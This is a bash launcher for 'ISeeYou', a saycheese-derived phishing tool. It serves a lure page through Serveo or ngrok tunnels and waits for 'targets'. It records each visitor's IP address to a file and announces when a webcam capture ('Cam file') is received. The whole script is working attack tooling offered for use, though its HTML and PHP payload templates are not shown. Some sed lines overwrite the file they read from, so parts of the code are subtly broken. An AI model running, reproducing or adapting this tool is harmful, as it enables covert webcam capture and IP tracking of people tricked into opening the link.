#!/bin/bash
# ISeeYou v1.0 - FIXED VERSION
# coded by: github.com/thelinuxchoice/saycheese
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {
  printf "\e[1;93m▄█    ▄▄▄▄▄   ▄███▄   ▄███▄ ▀▄    ▄ ████▄   ▄   \e[0m\n"
  printf "\e[1;93m██   █     ▀▄ █▀   ▀  █▀   ▀  █  █  █   █    █  \e[0m\n"
  printf "\e[1;93m██ ▄  ▀▀▀▀▄   ██▄▄    ██▄▄     ▀█   █   █ █   █ \e[0m\n"
  printf "\e[1;93m▐█  ▀▄▄▄▄▀    █▄   ▄▀ █▄   ▄▀  █    ▀████ █   █ \e[0m\n"
  printf "\e[1;93m ▐            ▀███▀   ▀███▀  ▄▀           █▄ ▄█ \e[0m\n"
  printf "\e[1;93m                                           ▀▀▀  \e[0m\n"
  printf " \e[1;93m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n\n"
}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi
  
  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi
  
  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi
  exit 1
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
  if [[ -e "ip.txt" ]]; then
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] IP:\e[0m\e[1;93m %s\e[0m\n" "$ip"
    cat ip.txt >> saved.ip.txt
  fi
}

checkfound() {
  printf "\n"
  printf "\e[1;93m[\e[0m\e[1;93m*\e[0m\e[1;93m] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
      printf "\n\e[1;93m[\e[0m+\e[1;93m] Target opened the link!\n"
      catch_ip
      rm -rf ip.txt
    fi
    
    sleep 0.5
    
    if [[ -e "Log.log" ]]; then
      printf "\n\e[1;93m[\e[0m+\e[1;93m] Cam file received!\e[0m\n"
      rm -rf Log.log
    fi
    sleep 0.5
  done
}

extract_ngrok_url() {
  local retries=0
  local max_retries=10
  local url=""
  
  while [[ $retries -lt $max_retries ]] && [[ -z $url ]]; do
    local api_response=$(curl -s --connect-timeout 5 http://127.0.0.1:4040/api/tunnels 2>/dev/null)
    
    if [[ -n "$api_response" ]]; then
      # Try grep first for https:// URLs
      url=$(echo "$api_response" | grep -oP 'https://[0-9a-zA-Z-]*\.ngrok\.(io|app)' | head -1)
      
      # If grep fails, try jq
      if [[ -z $url ]] && command -v jq &> /dev/null; then
        url=$(echo "$api_response" | jq -r '.tunnels[0].public_url' 2>/dev/null)
        if [[ "$url" == "null" ]] || [[ -z "$url" ]]; then
          url=""
        fi
      fi
      
      # If still empty, show response and retry
      if [[ -z $url ]]; then
        printf "\e[1;93m[DEBUG] Tunnel not ready yet (attempt $((retries+1))/$max_retries)\e[0m\n"
        sleep 2
        ((retries++))
      fi
    else
      printf "\e[1;93m[DEBUG] No response from API (attempt $((retries+1))/$max_retries)\e[0m\n"
      sleep 2
      ((retries++))
    fi
  done
  
  echo "$url"
}

extract_serveo_url() {
  grep -oP 'https://[0-9a-zA-Z-]*\.serveo\.net' "$1" 2>/dev/null | head -1
}

server() {
  command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
  
  printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Starting Serveo...\e[0m\n"
  
  checkphp=$(ps aux | grep -o "php" | head -n1)
  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi
  
  if [[ $subdomain_resp == true ]]; then
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "'$subdomain':80:localhost:3333" serveo.net 2> /dev/null > sendlink' &
    sleep 8
  else
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "80:localhost:3333" serveo.net 2> /dev/null > sendlink' &
    sleep 8
  fi
  
  printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Starting php server... (localhost:3333)\e[0m\n"
  fuser -k 3333/tcp > /dev/null 2>&1
  php -S localhost:3333 > /dev/null 2>&1 &
  sleep 3
  
  send_link=$(extract_serveo_url "sendlink")
  if [[ -z $send_link ]]; then
    printf "\e[1;93m[\e[0m\e[1;91m!\e[0m\e[1;93m] Failed to extract Serveo URL\e[0m\n"
  else
    printf "\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;93m %s\n" "$send_link"
  fi
}

payload_ngrok() {
  link=$(extract_ngrok_url)
  if [[ -z $link ]]; then
    printf "\e[1;93m[\e[0m\e[1;91m!\e[0m\e[1;93m] Failed to extract ngrok URL\e[0m\n"
    return 1
  fi
  
  sed "s|forwarding_link|$link|g" ISeeYou.html > ISeeYou.html 2>/dev/null
  sed "s|forwarding_link|$link|g" template.php > index.php 2>/dev/null
  return 0
}

ngrok_server() {
  if [[ ! -e ngrok ]]; then
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;93m[\e[0m+\e[1;93m] Downloading Ngrok...\n"
    
    arch=$(uname -m)
    if [[ $arch == *'arm'* ]] || [[ $arch == *'aarch64'* ]]; then
      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
      unzip -o ngrok-stable-linux-arm.zip > /dev/null 2>&1 && rm -f ngrok-stable-linux-arm.zip
    else
      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
      unzip -o ngrok-stable-linux-386.zip > /dev/null 2>&1 && rm -f ngrok-stable-linux-386.zip
    fi
    chmod +x ngrok
  fi
  
  printf "\e[1;93m[\e[0m+\e[1;93m] Starting php server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  
  printf "\e[1;93m[\e[0m+\e[1;93m] Starting ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 5
  
  printf "\e[1;93m[\e[0m+\e[1;93m] Getting ngrok URL (this may take a moment)...\n"
  link=$(extract_ngrok_url)
  
  if [[ -z $link ]]; then
    printf "\e[1;93m[\e[0m\e[1;91m!\e[0m\e[1;93m] Failed to get ngrok URL after retries\e[0m\n"
  else
    printf "\e[1;93m[\e[0m*\e[1;93m] Direct link:\e[0m\e[1;93m %s\e[0m\n" "$link"
  fi
  
  payload_ngrok
  checkfound
}

start1() {
  [[ -e sendlink ]] && rm -rf sendlink
  
  printf "\n"
  printf "\e[1;93m[\e[0m\e[1;93m01\e[0m\e[1;93m]\e[0m\e[1;93m Serveo.net\e[0m\n"
  printf "\e[1;93m[\e[0m\e[1;93m02\e[0m\e[1;93m]\e[0m\e[1;93m Ngrok\e[0m\n"
  
  read -p $'\n\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Choose a Port Forwarding option: \e[0m' option_server
  option_server="${option_server:-1}"
  
  if [[ $option_server -eq 1 ]]; then
    start
  elif [[ $option_server -eq 2 ]]; then
    ngrok_server
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    start1
  fi
}

payload() {
  send_link=$(extract_serveo_url "sendlink")
  if [[ -z $send_link ]]; then
    printf "\e[1;93m[\e[0m\e[1;91m!\e[0m\e[1;93m] Failed to extract Serveo URL\e[0m\n"
    return 1
  fi
  
  sed "s|forwarding_link|$send_link|g" ISeeYou.html > ISeeYou.html 2>/dev/null
  sed "s|forwarding_link|$send_link|g" template.php > index.php 2>/dev/null
  return 0
}

start() {
  default_choose_sub="Y"
  default_subdomain="ISeeYou$RANDOM"
  
  printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Choose subdomain? (Default:\e[0m\e[1;93m [Y/n] \e[0m\e[1;93m): \e[0m'
  read choose_sub
  choose_sub="${choose_sub:-${default_choose_sub}}"
  
  if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
    subdomain_resp=true
    printf '\e[1;93m[\e[0m\e[1;93m+\e[0m\e[1;93m] Subdomain: (Default:\e[0m\e[1;93m %s \e[0m\e[1;93m): \e[0m' "$default_subdomain"
    read subdomain
    subdomain="${subdomain:-${default_subdomain}}"
  fi
  
  server
  payload
  checkfound
}

banner
dependencies
start1
